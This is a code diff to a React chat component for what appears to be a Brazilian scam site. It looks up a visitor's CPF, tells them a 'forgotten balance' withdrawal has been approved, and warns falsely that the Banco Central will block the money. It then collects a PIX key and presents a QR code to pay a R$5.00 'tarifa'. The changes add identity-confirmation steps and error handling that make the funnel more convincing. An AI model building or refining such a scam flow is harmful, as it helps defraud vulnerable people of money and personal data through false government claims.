@@ -25,6 +25,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   const [leadPixKey, setLeadPixKey] = useState("");
   const [tarifa, setTarifa] = useState<number>(5.00);
   const [buyPixData, setBuyPixData] = useState<any>(null);
+  const [buyPixError, setBuyPixError] = useState<string>("");
   
   const [audioUrl, setAudioUrl] = useState<string | null>(null);
   const audioRef = useRef<HTMLAudioElement | null>(null);
@@ -94,13 +95,20 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         await sleep(1500);
         setTyping(true);
         
-        const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
-           docType: data.docType,
-           docValue: data.docValue
-        });
-        
-        const name = response.data?.data?.name || response.data?.name || response.data?.mockName || "Cidadão";
-        setLeadName(name);
+        let name = "Cidadão";
+        try {
+          const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
+             docType: data.docType,
+             docValue: data.docValue
+          });
+          name = response.data?.name || "Cidadão";
+          setLeadName(name);
+        } catch (e: any) {
+          setTyping(false);
+          const errorMsg = e.response?.data?.error || "Documento não encontrado ou inválido.";
+          addBotMessage(`❌ ${errorMsg} Por favor, atualize a página e tente novamente com dados válidos.`);
+          return; // Para o fluxo de chat
+        }
         
         const val = calculateValue(data.docValue);
         const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
@@ -114,34 +122,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         
         await sleep(2000);
         setTyping(true);
-        await sleep(3000);
+        await sleep(2000);
         setTyping(false);
-        addBotMessage(`Autenticação confirmada em nome de: ${name}. Buscando histórico de contas vinculadas e saldos inativos...`);
-
-        await sleep(2500);
-        setTyping(true);
-        await sleep(3500);
-        setTyping(false);
-        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
-        
-        await sleep(4000);
-        setTyping(true);
-        await sleep(3000);
-        setTyping(false);
-        addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
-        
-        await sleep(4000);
-        setTyping(true);
-        await sleep(5000);
-        setTyping(false);
-        addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
-        
-        await sleep(5000);
-        setTyping(true);
-        await sleep(3500);
-        setTyping(false);
-        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
-        setAwaitingPix(true);
+        addBotMessage(`Autenticação confirmada em nome de: **${name}**.\n\nVocê confirma que é você?`, [
+          { text: "Sim, sou eu", action: "confirm_identity_yes" },
+          { text: "Não, está errado", action: "confirm_identity_no" }
+        ]);
 
       } catch (e) {
         setTyping(false);
@@ -197,7 +183,83 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   };
 
   const handleAction = async (action: string, payload?: string) => {
-    if (action === "submit_pix") {
+    if (action === "confirm_identity_yes") {
+      setMessages(prev => {
+        const newMessages = [...prev];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+        return newMessages;
+      });
+      addUserMessage("Sim, sou eu");
+      setTyping(true);
+
+      setTimeout(() => {
+        setTyping(false);
+        addBotMessage(`Buscando histórico de contas vinculadas e saldos inativos...`);
+        
+        setTimeout(() => {
+          setTyping(true);
+          setTimeout(() => {
+            setTyping(false);
+            addBotMessage(`Parabéns, ${leadName}! A sua solicitação de saque foi aprovada no valor de ${leadValue} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            
+            setTimeout(() => {
+              setTyping(true);
+              setTimeout(() => {
+                setTyping(false);
+                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, [
+                  { text: "Já assisti o vídeo / Prosseguir", action: "proceed_after_video" }
+                ], undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
+              }, 3000);
+            }, 4000);
+          }, 3500);
+        }, 2500);
+      }, 800);
+    }
+    else if (action === "confirm_identity_no") {
+      setMessages(prev => {
+        const newMessages = [...prev];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+        return newMessages;
+      });
+      addUserMessage("Não, está errado");
+      setTyping(true);
+      setTimeout(() => {
+        setTyping(false);
+        addBotMessage("Por favor, atualize a página e preencha com o documento correto.");
+      }, 1000);
+    }
+    else if (action === "proceed_after_video") {
+      setMessages(prev => {
+        const newMessages = [...prev];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+        return newMessages;
+      });
+      addUserMessage("Já assisti o vídeo / Prosseguir");
+      setTyping(true);
+      
+      setTimeout(() => {
+        setTyping(false);
+        addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nObservação: Isso só acontecerá se você não concluir a etapa a seguir.`, [
+           { text: "Entendi, quero receber", action: "ask_pix" }
+        ], "/assets/banners/banner_atencao.png");
+      }, 1500);
+    }
+    else if (action === "ask_pix") {
+      setMessages(prev => {
+        const newMessages = [...prev];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+        return newMessages;
+      });
+      addUserMessage("Entendi, quero receber");
+      setTyping(true);
+
+      setTimeout(() => {
+        setTyping(false);
+        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+        setAwaitingPix(true);
+      }, 1500);
+    }
+    else if (action === "submit_pix") {
       const pix = payload || inputValue;
       if (!pix) return;
       
@@ -223,23 +285,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`Parabéns, **${leadName}**!\n\nA sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
-          { text: "Efetuar saque", action: "confirm_saque_1" }
-        ]);
-      }, 800);
-    }
-    else if (action === "confirm_saque_1") {
-      setMessages(prev => {
-        const newMessages = [...prev];
-        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
-        return newMessages;
-      });
-      setTyping(true);
-      
-      setTimeout(() => {
-        setTyping(false);
-        addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
-          { text: "Efetuar Saque", action: "generate_payment" }
+        addBotMessage(`Sua **solicitação de saque foi aprovada** para a Chave Pix:\n**${pix}**\n\nClique no botão abaixo para prosseguir com a **liberação da transferência**.`, [
+          { text: "Liberar Saque", action: "generate_payment" }
         ]);
       }, 800);
     }
@@ -286,9 +333,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       } catch (err: any) {
          console.error("Payment generation error", err);
          if (err.response?.data?.error) {
-           alert("Falha na geração do PIX: " + err.response.data.error);
+           setBuyPixError(err.response.data.error);
          } else {
-           alert("Falha ao se conectar com o servidor PIX.");
+           setBuyPixError("Falha ao se conectar com o servidor PIX.");
          }
       }
       setTyping(false);
@@ -564,7 +611,13 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
               {/* PIX Payment Area - Destacado */}
               <div className="w-full max-w-sm bg-white rounded-xl shadow-lg p-6 flex flex-col items-center border border-gray-100">
                 <h3 className="text-[#005CA9] font-black text-lg mb-4">Efetue o Pagamento da Tarifa</h3>
-                {buyPixData?.pix_qr_code ? (
+                {buyPixError ? (
+                  <div className="text-red-600 font-bold text-center text-sm p-4 bg-red-100 rounded-xl mb-4 border border-red-300 w-full">
+                    <p>⚠️ Erro na integração PIX</p>
+                    <p className="text-xs font-normal mt-1">{buyPixError}</p>
+                    <p className="text-[10px] text-gray-500 mt-2">Verifique sua chave de integração na API de pagamentos.</p>
+                  </div>
+                ) : buyPixData?.pix_qr_code ? (
                   <>
                     <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm w-48 h-48 flex items-center justify-center mb-4">
                         <QRCodeCanvas 
@@ -625,7 +678,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                            <p className="text-[10px] text-gray-500 font-bold mb-1">CÓDIGO PIX DA TARIFA</p>
                            <p className="text-[#004e98] font-bold text-sm mb-2">R$ {tarifa.toFixed(2)}</p>
                            
-                           {buyPixData?.pix_qr_code ? (
+                           {buyPixError ? (
+                             <div className="text-red-600 font-bold text-center text-[10px] p-2 bg-red-100 rounded-md mb-2 border border-red-300">
+                               {buyPixError}
+                             </div>
+                           ) : buyPixData?.pix_qr_code ? (
                              <button onClick={copyPix} className="bg-[#004e98] hover:bg-[#003870] text-white text-[11px] py-2 px-6 rounded-full font-bold shadow-md transition-transform active:scale-95 flex items-center gap-1 z-20 cursor-pointer">
                                <span>Copiar PIX</span>
                                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
